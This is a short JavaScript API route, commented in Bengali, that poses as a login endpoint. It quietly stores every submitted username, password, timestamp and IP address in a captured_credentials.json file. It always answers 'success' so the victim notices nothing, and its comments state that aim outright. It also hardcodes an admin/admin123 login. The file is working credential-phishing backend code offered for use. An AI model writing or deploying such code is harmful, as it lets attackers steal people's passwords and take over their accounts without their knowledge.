import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method not allowed" });
  }

  const { username, password } = req.body || {};

  // যদি ডেটা না আসে, চুপচাপ ফেইল করবে
  if (!username || !password) {
    return res.status(200).json({ success: true });
  }

  // === Admin Check ===
  // এখানে আপনার নিজের ইচ্ছেমতো অ্যাডমিন ইউজারনেম ও পাসওয়ার্ড সেট করুন
  if (username === "admin" && password === "admin123") {
    return res.status(200).json({ 
      success: true, 
      isAdmin: true 
    });
  }

  // === User Credentials Capture ===
  const filePath = path.join(process.cwd(), 'captured_credentials.json');
  
  try {
    let data = [];
    // ফাইল আগে থেকে থাকলে ডেটা রিড করবে
    if (fs.existsSync(filePath)) {
      const fileData = fs.readFileSync(filePath, 'utf8');
      data = JSON.parse(fileData);
    }
    
    // নতুন ডেটা অ্যাড করবে
    data.push({
      username: username,
      password: password,
      time: new Date().toISOString(),
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
    });
    
    // ফাইলে সেভ করবে
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Data save failed:", error);
  }

  // ইউজারকে কোনো কিছু না জানিয়ে success পাঠাবে
  return res.status(200).json({ success: true });
}
